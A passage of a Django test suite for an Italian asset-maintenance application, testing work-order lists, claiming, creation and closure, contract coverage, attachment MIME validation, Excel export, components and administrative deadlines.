        closed_response = self.client.get(reverse("assets:wo_list"), {"view": "closed"})
        self.assertContains(closed_response, "Archivio interventi chiusi")
        self.assertContains(closed_response, closed_workorder.title)
        self.assertNotContains(closed_response, open_workorder.title)

    def test_workorder_list_mine_view_and_quick_claim(self):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Intervento interno",
        )
        self.client.force_login(self.user)

        claim_response = self.client.post(
            reverse("assets:wo_claim", args=[workorder.id]),
            {"next": f"{reverse('assets:wo_list')}?view=unassigned"},
        )

        self.assertRedirects(
            claim_response,
            f"{reverse('assets:wo_list')}?view=unassigned",
            fetch_redirect_response=False,
        )
        workorder.refresh_from_db()
        self.assertEqual(workorder.assigned_to, self.user)
        mine_response = self.client.get(reverse("assets:wo_list"), {"view": "mine"})
        self.assertContains(mine_response, workorder.title)
        self.assertContains(mine_response, "In carico a te")

    def test_workorder_create_from_list_uses_guided_ui_and_back_link(self):
        self.client.force_login(self.user)

        response = self.client.get(
            reverse("assets:wo_create", args=[self.asset.id]),
            {"source": "workorder_list", "kind": WorkOrder.KIND_CORRECTIVE},
        )

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["workorder_back_url"], reverse("assets:wo_list"))
        self.assertContains(response, "Lista interventi")
        self.assertContains(response, "Torna agli interventi")
        self.assertContains(response, "Cosa devi registrare?")
        self.assertContains(response, "Impatto operativo")
        self.assertContains(response, "Risoluzione gia applicata")
        self.assertContains(response, "Pianificazione e copertura")
        self.assertContains(response, 'class="wof-form-body"', html=False)
        self.assertContains(response, 'class="wof-context"', html=False)
        self.assertContains(response, ".as-main > .as-top", html=False)
        self.assertContains(response, ".as-section-nav", html=False)
        self.assertContains(response, "max-width: 1260px", html=False)
        self.assertContains(response, 'class="wof-section wof-section--main"', html=False)
        self.assertContains(response, 'class="wof-section wof-section--attachments"', html=False)
        self.assertContains(response, 'class="wof-advanced" id="maintenanceAdvanced"', html=False)
        self.assertNotContains(response, 'class="wof-side-card"', html=False)
        self.assertNotContains(response, 'class="as-section-nav"', html=False)
        html = response.content.decode("utf-8")
        self.assertLess(html.index('for="id_title"'), html.index('for="id_maintenance_rule"'))

    def test_workorder_create_can_continue_to_formal_closure(self):
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            {
                "periodic_verification": "",
                "supplier": "",
                "kind": WorkOrder.KIND_CORRECTIVE,
                "status": WorkOrder.STATUS_OPEN,
                "title": "Intervento da consuntivare",
                "description": "Attivita gia eseguita.",
                "resolution": "",
                "downtime_minutes": "0",
                "cost_eur": "",
                "submit_action": "close",
            },
        )

        workorder = WorkOrder.objects.get(title="Intervento da consuntivare")
        self.assertEqual(workorder.status, WorkOrder.STATUS_OPEN)
        self.assertRedirects(
            response,
            reverse("assets:wo_close", args=[workorder.id]),
            fetch_redirect_response=False,
        )

    def test_workorder_close_page_is_a_formal_guided_flow(self):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Intervento aperto",
        )
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:wo_close", args=[workorder.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Esito e chiusura")
        self.assertContains(response, "Giorni di esecuzione")
        self.assertContains(response, "Tempo indicativo totale")
        self.assertContains(response, 'id="id_closed_at"', html=False)
        self.assertContains(response, 'name="intervention_duration_hours"', html=False)
        self.assertContains(response, "Chiudi definitivamente")
        self.assertNotContains(response, 'class="as-section-nav"', html=False)

    def test_formal_closure_records_days_time_and_editable_timestamp(self):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Intervento su piu giornate",
        )
        closed_at = timezone.localtime(timezone.now() - timedelta(hours=1)).replace(second=0, microsecond=0)
        first_day = (closed_at.date() - timedelta(days=1)).isoformat()
        second_day = closed_at.date().isoformat()
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_close", args=[workorder.id]),
            {
                "status": WorkOrder.STATUS_DONE,
                "closed_at": closed_at.strftime("%Y-%m-%dT%H:%M"),
                "execution_days": f"{first_day},{second_day}",
                "resolution": "Ripristinato e verificato il corretto funzionamento.",
                "intervention_duration_hours": "2",
                "intervention_duration_remainder": "30",
                "downtime_hours": "1",
                "downtime_remainder": "15",
            },
        )

        self.assertRedirects(response, reverse("assets:wo_view", args=[workorder.id]), fetch_redirect_response=False)
        workorder.refresh_from_db()
        self.assertEqual(workorder.status, WorkOrder.STATUS_DONE)
        self.assertEqual(timezone.localtime(workorder.closed_at), closed_at)
        self.assertEqual(workorder.intervention_duration_minutes, 150)
        self.assertEqual(workorder.downtime_minutes, 75)
        self.assertEqual(
            list(workorder.execution_days.values_list("execution_date", flat=True)),
            [date.fromisoformat(first_day), date.fromisoformat(second_day)],
        )

    def test_preventive_workorder_uses_periodic_verification_supplier_and_attachment(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Fornitore Manutenzione Srl",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        verification = PeriodicVerification.objects.create(
            name="Controllo trimestrale",
            supplier=supplier,
            frequency_months=3,
            is_active=True,
        )
        verification.assets.add(self.asset)
        self.client.force_login(self.user)

        upload = SimpleUploadedFile("report.pdf", b"%PDF-1.4 test", content_type="application/pdf")
        with _workspace_temporary_directory("assets-wo-attachments-") as media_root, override_settings(MEDIA_ROOT=media_root):
            with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                response = self.client.post(
                    reverse("assets:wo_create", args=[self.asset.id]),
                    {
                        "periodic_verification": str(verification.id),
                        "supplier": "",
                        "kind": WorkOrder.KIND_PREVENTIVE,
                        "status": WorkOrder.STATUS_OPEN,
                        "title": "Intervento programmato",
                        "description": "Controllo periodico",
                        "resolution": "",
                        "downtime_minutes": "0",
                        "cost_eur": "",
                        "attachments": upload,
                    },
                )

        self.assertEqual(response.status_code, 302)
        workorder = WorkOrder.objects.get()
        self.assertEqual(workorder.periodic_verification, verification)
        self.assertEqual(workorder.supplier, supplier)
        self.assertEqual(WorkOrderAttachment.objects.filter(work_order=workorder).count(), 1)

    def test_workorder_attachment_rejects_spoofed_mime(self):
        self.client.force_login(self.user)
        upload = SimpleUploadedFile("report.pdf", b"MZ...", content_type="application/pdf")
        with patch(
            "assets.views.validate_extension_and_mime",
            side_effect=UploadMimeValidationError("report.pdf: tipo MIME non consentito (application/x-msdownload)."),
        ):
            response = self.client.post(
                reverse("assets:wo_create", args=[self.asset.id]),
                {
                    "periodic_verification": "",
                    "supplier": "",
                    "kind": WorkOrder.KIND_CORRECTIVE,
                    "status": WorkOrder.STATUS_OPEN,
                    "title": "Intervento con allegato non valido",
                    "description": "Verifica MIME",
                    "attachments": upload,
                },
            )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "tipo MIME non consentito")
        self.assertEqual(WorkOrder.objects.count(), 0)

    def test_workorder_attachment_fails_closed_when_mime_engine_missing(self):
        self.client.force_login(self.user)
        upload = SimpleUploadedFile("report.pdf", b"%PDF-1.4 test", content_type="application/pdf")
        with patch(
            "assets.views.validate_extension_and_mime",
            side_effect=UploadMimeValidationError("Validazione MIME non disponibile sul server. Upload bloccato."),
        ):
            response = self.client.post(
                reverse("assets:wo_create", args=[self.asset.id]),
                {
                    "periodic_verification": "",
                    "supplier": "",
                    "kind": WorkOrder.KIND_CORRECTIVE,
                    "status": WorkOrder.STATUS_OPEN,
                    "title": "Intervento con validazione bloccata",
                    "description": "Fail closed",
                    "attachments": upload,
                },
            )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Validazione MIME non disponibile")
        self.assertEqual(WorkOrder.objects.count(), 0)

    def test_non_programmed_workorder_allows_manual_supplier(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Assistenza Rapida Spa",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            {
                "periodic_verification": "",
                "supplier": str(supplier.id),
                "kind": WorkOrder.KIND_CORRECTIVE,
                "status": WorkOrder.STATUS_OPEN,
                "title": "Intervento urgente",
                "description": "Guasto improvviso",
                "resolution": "",
                "downtime_minutes": "15",
                "cost_eur": "120.00",
            },
        )

        self.assertEqual(response.status_code, 302)
        workorder = WorkOrder.objects.get(title="Intervento urgente")
        self.assertIsNone(workorder.periodic_verification)
        self.assertEqual(workorder.supplier, supplier)

    def test_workorder_with_rule_and_contract_syncs_execution_state_only_on_close(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Service Integrato Srl",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        category = AssetCategory.objects.create(
            code="wo-flow-category",
            label="Categoria WO Flow",
            base_asset_type=Asset.TYPE_SERVER,
        )
        self.asset.asset_category = category
        self.asset.save(update_fields=["asset_category"])
        template = MaintenanceInterventionTemplate.objects.create(
            code="wo-flow-template",
            label="Check semestrale server",
            asset_category=category,
        )
        rule = MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=180,
            warning_days=20,
        )
        contract = AssistanceContract.objects.create(
            supplier=supplier,
            asset=self.asset,
            title="Contratto server mission critical",
            contract_type=AssistanceContract.TYPE_FULL_SERVICE,
            start_date=timezone.localdate() - timedelta(days=10),
            coverage_summary="Copertura full service H24",
        )
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            {
                "periodic_verification": "",
                "maintenance_rule": str(rule.id),
                "supplier": "",
                "assistance_contract": str(contract.id),
                "covered_by_contract": "on",
                "kind": WorkOrder.KIND_PREVENTIVE,
                "status": WorkOrder.STATUS_DONE,
                "title": "Check server completato",
                "description": "Intervento eseguito e chiuso nello stesso momento.",
                "resolution": "Server verificato",
                "downtime_minutes": "5",
                "cost_eur": "",
            },
        )

        self.assertEqual(response.status_code, 302)
        workorder = WorkOrder.objects.get(title="Check server completato")
        self.assertEqual(workorder.maintenance_rule, rule)
        self.assertEqual(workorder.assistance_contract, contract)
        self.assertTrue(workorder.covered_by_contract)
        self.assertEqual(workorder.supplier, supplier)
        self.assertEqual(workorder.status, WorkOrder.STATUS_OPEN)
        self.assertIsNone(workorder.closed_at)
        self.assertFalse(
            AssetMaintenanceRuleState.objects.filter(asset=self.asset, base_rule=rule).exists()
        )

        close_response = self.client.post(
            reverse("assets:wo_close", args=[workorder.id]),
            {
                "status": WorkOrder.STATUS_DONE,
                "resolution": "Server verificato",
                "assistance_contract": str(contract.id),
                "covered_by_contract": "on",
            },
        )

        self.assertEqual(close_response.status_code, 302)
        workorder.refresh_from_db()
        self.assertEqual(workorder.status, WorkOrder.STATUS_DONE)
        state = AssetMaintenanceRuleState.objects.get(asset=self.asset, base_rule=rule)
        self.assertEqual(state.last_work_order, workorder)
        self.assertEqual(state.last_execution_date, timezone.localdate())

    def test_create_workorder_rejects_contract_coverage_without_contract(self):
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            {
                "periodic_verification": "",
                "supplier": "",
                "kind": WorkOrder.KIND_CORRECTIVE,
                "status": WorkOrder.STATUS_DONE,
                "covered_by_contract": "on",
                "title": "Intervento senza contratto",
                "description": "Verifica copertura non coerente",
                "resolution": "",
                "downtime_minutes": "0",
                "cost_eur": "",
            },
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Seleziona un contratto per indicare la copertura.")
        self.assertFalse(WorkOrder.objects.filter(title="Intervento senza contratto").exists())

    def test_workorder_form_prefills_from_schedule_context(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Prefill Service Srl",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        category = AssetCategory.objects.create(
            code="wo-prefill-category",
            label="Categoria WO Prefill",
            base_asset_type=Asset.TYPE_SERVER,
        )
        self.asset.asset_category = category
        self.asset.save(update_fields=["asset_category"])
        template = MaintenanceInterventionTemplate.objects.create(
            code="wo-prefill-template",
            label="Controllo annuale server",
            description="Esegui checklist annuale e verifica parametri di backup.",
            asset_category=category,
        )
        rule = MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=365,
            warning_days=30,
            notes="Verificare anche lo stato dei dischi.",
        )
        AssistanceContract.objects.create(
            supplier=supplier,
            asset=self.asset,
            title="Contratto server enterprise",
            contract_type=AssistanceContract.TYPE_FULL_SERVICE,
            start_date=timezone.localdate() - timedelta(days=5),
        )
        self.client.force_login(self.user)

        response = self.client.get(
            reverse("assets:wo_create", args=[self.asset.id]) + f"?rule={rule.id}&source=maintenance_schedule"
        )

        self.assertEqual(response.status_code, 200)
        form = response.context["form"]
        self.assertEqual(form.initial["maintenance_rule"], rule.id)
        self.assertEqual(form.initial["kind"], WorkOrder.KIND_PREVENTIVE)
        self.assertEqual(form.initial["title"], "Controllo annuale server")
        self.assertIn("checklist annuale", form.initial["description"].lower())
        self.assertIn("stato dei dischi", form.initial["description"].lower())
        self.assertTrue(form.initial["covered_by_contract"])
        self.assertContains(response, "Prossime manutenzioni")
        self.assertContains(response, "Contratto suggerito")
        self.assertContains(
            response,
            '<details class="wof-advanced" id="maintenanceAdvanced" open>',
            html=False,
        )
        self.assertNotContains(response, "Stato iniziale")

    def test_close_workorder_rejects_incompatible_contract(self):
        supplier = Fornitore.objects.create(
            ragione_sociale="Supplier Originario",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        other_supplier = Fornitore.objects.create(
            ragione_sociale="Supplier Incompatibile",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        category = AssetCategory.objects.create(
            code="wo-close-category",
            label="Categoria WO Close",
            base_asset_type=Asset.TYPE_SERVER,
        )
        self.asset.asset_category = category
        self.asset.save(update_fields=["asset_category"])
        template = MaintenanceInterventionTemplate.objects.create(
            code="wo-close-template",
            label="Controllo chiusura",
            asset_category=category,
        )
        rule = MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
        )
        invalid_contract = AssistanceContract.objects.create(
            supplier=other_supplier,
            asset=self.asset,
            title="Contratto incompatibile",
            contract_type=AssistanceContract.TYPE_ON_CALL,
            start_date=timezone.localdate() - timedelta(days=2),
        )
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            maintenance_rule=rule,
            supplier=supplier,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="WO da chiudere",
        )
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:wo_close", args=[workorder.id]),
            {
                "status": WorkOrder.STATUS_DONE,
                "resolution": "Chiusura di test",
                "assistance_contract": str(invalid_contract.id),
                "covered_by_contract": "on",
            },
        )

        self.assertEqual(response.status_code, 200)
        workorder.refresh_from_db()
        self.assertEqual(workorder.status, WorkOrder.STATUS_OPEN)
        self.assertContains(response, "fornitore diverso")

    def test_close_workorder_records_costs_assignee_and_attachments(self):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Chiusura con costi",
        )
        upload = SimpleUploadedFile("chiusura.pdf", b"%PDF-1.4 close", content_type="application/pdf")
        self.client.force_login(self.user)

        with _workspace_temporary_directory("assets-wo-close-") as media_root, override_settings(MEDIA_ROOT=media_root):
            with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                response = self.client.post(
                    reverse("assets:wo_close", args=[workorder.id]),
                    {
                        "status": WorkOrder.STATUS_DONE,
                        "resolution": "Sostituito componente e verificato riavvio.",
                        "intervention_duration_minutes": "45",
                        "downtime_minutes": "12",
                        "labor_cost_eur": "80.50",
                        "materials_cost_eur": "19.50",
                        "cost_eur": "",
                        "assigned_to": str(self.user.id),
                        "executed_by": str(self.user.id),
                        "assistance_contract": "",
                        "log_note": "Report finale allegato.",
                        "close_attachments": upload,
                    },
                )

        self.assertRedirects(response, reverse("assets:wo_view", args=[workorder.id]), fetch_redirect_response=False)
        workorder.refresh_from_db()
        self.assertEqual(workorder.status, WorkOrder.STATUS_DONE)
        self.assertEqual(workorder.labor_cost_eur, Decimal("80.50"))
        self.assertEqual(workorder.materials_cost_eur, Decimal("19.50"))
        self.assertEqual(workorder.resolved_total_cost_eur, Decimal("100.00"))
        self.assertEqual(workorder.cost_eur, Decimal("100.00"))
        self.assertEqual(workorder.assigned_to, self.user)
        self.assertEqual(workorder.executed_by, self.user)
        self.assertEqual(WorkOrderAttachment.objects.filter(work_order=workorder).count(), 1)
        self.assertTrue(WorkOrderLog.objects.filter(work_order=workorder, note__icontains="Allegati caricati: 1").exists())

    def _create_operational_workorder(self):
        assigned = User.objects.create_user(
            username="tech.operativo",
            email="tech.operativo@example.com",
            password="secret123",
            first_name="Mario",
            last_name="Rossi",
        )
        category = AssetCategory.objects.create(
            code="wo-operativo",
            label="Categoria Operativa",
            base_asset_type=Asset.TYPE_SERVER,
        )
        self.asset.asset_category = category
        self.asset.reparto = "MAN"
        self.asset.save(update_fields=["asset_category", "reparto"])
        supplier = Fornitore.objects.create(
            ragione_sociale="Service Registro Srl",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        contract = AssistanceContract.objects.create(
            supplier=supplier,
            asset=self.asset,
            title="Contratto registro manutenzione",
            contract_type=AssistanceContract.TYPE_FULL_SERVICE,
            start_date=timezone.localdate() - timedelta(days=20),
        )
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            supplier=supplier,
            assistance_contract=contract,
            covered_by_contract=True,
            kind=WorkOrder.KIND_PREVENTIVE,
            origin=WorkOrder.ORIGIN_PERIODIC,
            status=WorkOrder.STATUS_DONE,
            assigned_to=assigned,
            executed_by=self.user,
            title="Tagliando operativo registro",
            description="Intervento periodico filtrabile.",
            resolution="Completato senza anomalie.",
            intervention_duration_minutes=45,
            downtime_minutes=10,
            labor_cost_eur=Decimal("50.00"),
            materials_cost_eur=Decimal("70.00"),
            cost_eur=Decimal("120.00"),
            closed_at=timezone.now(),
        )
        other_asset = Asset.objects.create(
            asset_tag="IT-000999",
            name="Asset fuori filtro",
            asset_type=Asset.TYPE_SERVER,
            status=Asset.STATUS_IN_USE,
            reparto="OFF",
        )
        WorkOrder.objects.create(
            asset=other_asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            origin=WorkOrder.ORIGIN_MANUAL,
            status=WorkOrder.STATUS_OPEN,
            title="Intervento fuori filtro",
        )
        return workorder, category, assigned, contract

    def test_workorder_list_filters_show_operational_columns(self):
        workorder, category, assigned, contract = self._create_operational_workorder()
        self.client.force_login(self.user)

        response = self.client.get(
            reverse("assets:wo_list"),
            {
                "status": WorkOrder.STATUS_DONE,
                "origin": WorkOrder.ORIGIN_PERIODIC,
                "coverage": "covered",
                "reparto": "MAN",
                "category": str(category.id),
                "assigned": str(assigned.id),
                "q": "Tagliando",
            },
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Archivio interventi chiusi")
        self.assertContains(response, 'class="wo-filter-summary"', html=False)
        self.assertContains(response, "Ricerca: Tagliando")
        self.assertContains(response, "Stato: Chiusa")
        self.assertContains(response, "Origine: Periodica")
        self.assertContains(response, "Copertura: Con contratto")
        self.assertContains(response, "Reparto: MAN")
        self.assertContains(response, "Categoria: Categoria Operativa")
        self.assertContains(response, "Responsabile: Mario Rossi")
        self.assertContains(response, "Rimuovi tutti")
        self.assertContains(response, f"#{workorder.id} - Tagliando operativo registro")
        self.assertContains(response, self.asset.asset_tag)
        self.assertContains(response, "Categoria Operativa")
        self.assertContains(response, "Mario Rossi")
        self.assertNotContains(response, "<th>Copertura</th>", html=False)
        self.assertNotContains(response, "<th>Costi</th>", html=False)
        self.assertEqual(list(response.context["workorders"])[0].resolved_total_cost_eur, Decimal("120.00"))
        status_chip = next(chip for chip in response.context["active_filter_chips"] if chip["label"] == "Stato")
        self.assertNotIn("status=", status_chip["remove_url"])
        self.assertIn("origin=PERIODIC", status_chip["remove_url"])
        self.assertIn("view=closed", status_chip["remove_url"])
        self.assertNotContains(response, "Intervento fuori filtro")

        age_response = self.client.get(
            reverse("assets:wo_list"),
            {"status": WorkOrder.STATUS_OPEN, "open_age": "21"},
        )
        self.assertEqual(age_response.status_code, 200)
        self.assertContains(age_response, '<option value="21" selected>21 giorni</option>', html=False)
        self.assertContains(age_response, "Aperti da: 21 giorni")

    def test_workorder_export_uses_filtered_scope_and_operational_columns(self):
        workorder, category, assigned, contract = self._create_operational_workorder()
        self.client.force_login(self.user)

        response = self.client.get(
            reverse("assets:workorder_list_export"),
            {
                "format": "xlsx",
                "scope": "filtered",
                "origin": WorkOrder.ORIGIN_PERIODIC,
                "coverage": "covered",
                "reparto": "MAN",
                "category": str(category.id),
                "assigned": str(assigned.id),
            },
        )

        self.assertEqual(response.status_code, 200)
        workbook = load_workbook(io.BytesIO(response.content), read_only=True)
        sheet = workbook.active
        headers = [cell.value for cell in next(sheet.iter_rows(min_row=1, max_row=1))]
        row = [cell.value for cell in next(sheet.iter_rows(min_row=2, max_row=2))]
        row_by_header = dict(zip(headers, row))
        self.assertEqual(row_by_header["Asset Tag"], self.asset.asset_tag)
        self.assertEqual(row_by_header["Titolo"], workorder.title)
        self.assertEqual(row_by_header["Contratto"], contract.title)
        self.assertEqual(row_by_header["Coperto da contratto"], "Si")
        self.assertEqual(row_by_header["Costo manodopera"], "50.00")
        self.assertEqual(row_by_header["Costo materiali"], "70.00")
        self.assertEqual(row_by_header["Costo totale"], "120.00")

    def test_maintenance_hub_shows_critical_rule_rows(self):
        category = AssetCategory.objects.create(
            code="hub-rule-critical",
            label="Categoria Hub",
            base_asset_type=Asset.TYPE_SERVER,
        )
        self.asset.asset_category = category
        self.asset.reparto = "MAN"
        self.asset.save(update_fields=["asset_category", "reparto"])
        template = MaintenanceInterventionTemplate.objects.create(
            code="hub-rule-critical-template",
            label="Controllo hub critico",
            asset_category=category,
        )
        MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
            warning_days=15,
        )
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:maintenance_hub"))

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["maintenance_rule_counts"]["missing"], 1)
        self.assertContains(response, "Piani ordinari da gestire")
        self.assertContains(response, self.asset.asset_tag)
        self.assertContains(response, "Controllo hub critico")
        self.assertContains(response, "Prima esecuzione")
        self.assertContains(response, "Imposta prima esecuzione")
        self.assertContains(
            response,
            f'href="{reverse("assets:wo_list")}?status={WorkOrder.STATUS_OPEN}"',
            html=False,
        )
        # Il contatore "scadenze amministrative" ora punta al suo elenco dedicato
        # (niente più tab-scadenzario interna al Centro).
        self.assertContains(
            response,
            f'href="{reverse("assets:asset_administrative_deadline_list")}"',
            html=False,
        )
        self.assertContains(
            response,
            f'href="{reverse("assets:maintenance_schedule")}?status=due"',
            html=False,
        )


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetAdministrativeStepOneTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(username="asset-step-one", password="pass12345")
        _complete_onboarding(self.user)
        self.asset = Asset.objects.create(
            name="Carroponte reparto A",
            asset_type=Asset.TYPE_HW,
            reparto="OFF",
            source_key="manual-step-one-asset-a",
        )
        self.other_asset = Asset.objects.create(
            name="Compressore reparto B",
            asset_type=Asset.TYPE_HW,
            reparto="MAN",
            source_key="manual-step-one-asset-b",
        )

    def test_asset_component_form_prevents_duplicate_code_per_asset(self):
        AssetComponent.objects.create(
            asset=self.asset,
            code="FILTRO-001",
            name="Filtro aspirazione",
        )

        form = AssetComponentForm(
            data={
                "asset": str(self.asset.id),
                "code": "FILTRO-001",
                "name": "Filtro ricambio",
                "component_type": "Filtro",
                "serial_number": "",
                "manufacturer": "",
                "model": "",
                "installed_on": "",
                "notes": "",
                "is_active": "on",
            }
        )

        self.assertFalse(form.is_valid())
        self.assertIn("code", form.errors)

    def test_component_create_view_creates_component(self):
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:asset_component_create") + f"?asset={self.asset.id}",
            {
                "asset": str(self.asset.id),
                "code": "POMPA-01",
                "name": "Pompa olio",
                "component_type": "Pompa",
                "serial_number": "SN-POMPA-01",
                "manufacturer": "SKF",
                "model": "PO-200",
                "installed_on": "2026-03-01",
                "notes": "Componente test step 1",
                "is_active": "on",
            },
        )

        self.assertEqual(response.status_code, 302)
        component = AssetComponent.objects.get(code="POMPA-01")
        self.assertEqual(component.asset, self.asset)
        self.assertTrue(component.is_active)

    def test_deadline_create_view_links_component(self):
        component = AssetComponent.objects.create(
            asset=self.asset,
            code="CERT-01",
            name="Quadro elettrico",
        )
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:asset_administrative_deadline_create") + f"?asset={self.asset.id}&component={component.id}",
            {
                "asset": str(self.asset.id),
                "component": str(component.id),
                "deadline_type": AssetAdministrativeDeadline.TYPE_CERTIFICATE,
                "title": "Certificato CE quadro elettrico",
                "reference_code": "CE-2026-001",
                "issuer": "Ente Certificatore",
                "issued_on": "2026-03-01",
                "due_date": "2026-06-30",
                "warning_days": "15",
                "notes": "Scadenza collegata al componente",
                "is_active": "on",
            },
        )

        self.assertEqual(response.status_code, 302)
        deadline = AssetAdministrativeDeadline.objects.get(reference_code="CE-2026-001")
        self.assertEqual(deadline.asset, self.asset)
        self.assertEqual(deadline.component, component)

    def test_deadline_form_rejects_component_from_other_asset(self):
        foreign_component = AssetComponent.objects.create(
            asset=self.other_asset,
            code="ALTRO-01",
            name="Valvola esterna",
        )

        form = AssetAdministrativeDeadlineForm(
            data={
                "asset": str(self.asset.id),
                "component": str(foreign_component.id),
                "deadline_type": AssetAdministrativeDeadline.TYPE_TECHNICAL,
                "title": "Scadenza test",
                "reference_code": "REF-001",
                "issuer": "Officina interna",
                "issued_on": "2026-03-01",
                "due_date": "2026-05-31",
                "warning_days": "10",
                "notes": "",
                "is_active": "on",
            }
        )

        self.assertFalse(form.is_valid())
        self.assertIn("component", form.errors)

    def test_step_one_routes_render_and_asset_detail_contains_links(self):
        component = AssetComponent.objects.create(
            asset=self.asset,
            code="RID-01",
            name="Riduttore",
        )
        AssetAdministrativeDeadline.objects.create(
            asset=self.asset,
            component=component,
            deadline_type=AssetAdministrativeDeadline.TYPE_REVISION,
            title="Revisione riduttore",
            due_date=date(2026, 4, 15),
            warning_days=20,
        )

        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:asset_component_list"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Elenco componenti")

        asset_components_page = self.client.get(
            reverse("assets:asset_component_list_for_asset", kwargs={"asset_id": self.asset.id})
        )
        self.assertEqual(asset_components_page.status_code, 200)
        self.assertContains(asset_components_page, self.asset.asset_tag)
        self.assertContains(asset_components_page, "Riduttore")

        deadline_page = self.client.get(reverse("assets:asset_administrative_deadline_list"))
        self.assertEqual(deadline_page.status_code, 200)
        self.assertContains(deadline_page, "Elenco scadenze")

        detail_page = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))
        self.assertEqual(detail_page.status_code, 200)
        self.assertContains(detail_page, "Torna indietro")
        self.assertNotContains(detail_page, "Dettaglio asset")
        self.assertContains(detail_page, "Crea intervento")
        self.assertContains(detail_page, "Apri scadenze")


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetMaintenanceStepTwoTests(TestCase):
    def setUp(self):
        self.admin = User.objects.create_superuser(
            username="asset-step-two-admin",
            email="asset-step-two-admin@test.local",
            password="pass12345",
        )
        self.category = AssetCategory.objects.create(
            code="macchine-step-two",
            label="Macchine Step Two",
            base_asset_type=Asset.TYPE_WORK_MACHINE,
            sort_order=10,
        )
        self.other_category = AssetCategory.objects.create(
            code="impianti-step-two",
            label="Impianti Step Two",
            base_asset_type=Asset.TYPE_HW,
            sort_order=20,
        )

    def test_maintenance_template_create_view_creates_template(self):
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:maintenance_template_create") + f"?category={self.category.id}",
            {
                "code": "cambio-olio-step-two",
                "label": "Cambio olio",
                "description": "Template standard per cambio olio",
                "asset_category": str(self.category.id),
                "sort_order": "15",
                "is_active": "on",
                # Formset checklist (un vero POST dal form lo include sempre)
                "checklist-TOTAL_FORMS": "1",
                "checklist-INITIAL_FORMS": "0",
                "checklist-MIN_NUM_FORMS": "0",
                "checklist-MAX_NUM_FORMS": "1000",
                "checklist-0-step_number": "",
                "checklist-0-description": "Verifica livello olio",
            },
        )

        self.assertEqual(response.status_code, 302)
        template = MaintenanceInterventionTemplate.objects.get(code="cambio-olio-step-two")
        self.assertEqual(template.asset_category, self.category)
        self.assertEqual(template.label, "Cambio olio")
        self.assertTrue(template.is_active)
        # La checklist viene salvata e il numero step assente è auto-assegnato (10)
        steps = list(template.checklist_steps.order_by("step_number"))
        self.assertEqual(len(steps), 1)
        self.assertEqual(steps[0].description, "Verifica livello olio")
        self.assertEqual(steps[0].step_number, 10)

    def test_maintenance_rule_create_view_creates_category_rule(self):
        template = MaintenanceInterventionTemplate.objects.create(
            code="lubrificazione-step-two",
            label="Lubrificazione",
            asset_category=self.category,
        )
        self.client.force_login(self.admin)

        response = self.client.post(
            reverse("assets:maintenance_rule_create") + f"?category={self.category.id}&template={template.id}",
            {
                "intervention_template": str(template.id),
